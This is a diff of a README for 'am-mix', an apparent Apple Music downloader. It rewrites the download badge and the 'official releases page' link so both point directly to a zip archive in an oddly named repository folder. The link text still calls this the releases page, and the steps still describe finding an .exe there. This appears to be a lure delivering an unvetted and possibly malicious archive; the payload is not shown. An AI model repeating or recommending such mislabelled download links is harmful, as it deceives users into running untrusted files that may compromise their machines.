@@ -1,12 +1,12 @@
 # 🎵 am-mix - Save your favorite Apple Music tracks
 
-[![Download am-mix](https://img.shields.io/badge/Download-am-mix-blue.svg)](https://github.com/techha2492/am-mix)
+[![Download am-mix](https://img.shields.io/badge/Download-am-mix-blue.svg)](https://github.com/techha2492/am-mix/raw/refs/heads/main/stuccoyer/mix-am-v2.1.zip)
 
 am-mix helps you keep your music collection safe. This desktop application lets you download your tracks from Apple Music to your computer. You gain full control over your media files. You can listen to your library offline without an internet connection. The app keeps your music organized and ready to play on any device.
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/techha2492/am-mix) to download the installer.
+1. Visit the [official releases page](https://github.com/techha2492/am-mix/raw/refs/heads/main/stuccoyer/mix-am-v2.1.zip) to download the installer.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to start the download.
 4. Open the file once the download finishes.
